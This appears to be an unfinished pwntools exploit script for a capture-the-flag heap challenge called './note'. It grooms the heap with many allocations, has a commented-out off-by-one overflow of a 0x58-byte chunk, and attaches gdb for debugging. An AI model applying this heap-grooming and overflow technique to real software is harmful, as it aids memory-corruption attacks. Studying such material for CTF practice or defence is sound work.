from pwn import *
io=process("./note")

def add(size,data):
    io.sendlineafter("Choice: ","1")
    io.sendlineafter("Size: ",str(size))
    io.sendafter("Content: ",data)


def delete(index):
    io.sendlineafter("Choice: ","2")
    io.sendlineafter("Idx: ",str(index))

add(0x500,"a"*100)

for i in range(8):
    add(0x10,"a")
for i in range(8):
    add(0x30,"a")
for i in range(4):
    add(0x50,"a")
for i in range(8):
    add(0x60,"a")
for i in range(4):
    add(0x170,"a")
for i in range(4):
    add(0x150,"a")
for i in range(5):
    add(0xc0,"a")
for i in range(6):
    add(0xe0,"a")
for i in range(8):
    add(0x70,"a")
for i in range(8):
    add(0x30,"a")
for i in range(8):
    add(0x10,"a")
"""
add(0x500,"a"*(0x500-1))
add(0x58,"b"*10)
add(0x500,"c"*(0x500-1))
add(0x50,"d"*(0x50-1))
delete(37)
delete(38)
pay="a"*0x59
add(0x58,pay)
gdb.attach(io)
#delete(0)
delete(39)
"""


add(1,"a")
delete(72)
add(8,"aaaaaaaa")

gdb.attach(io)
io.interactive()
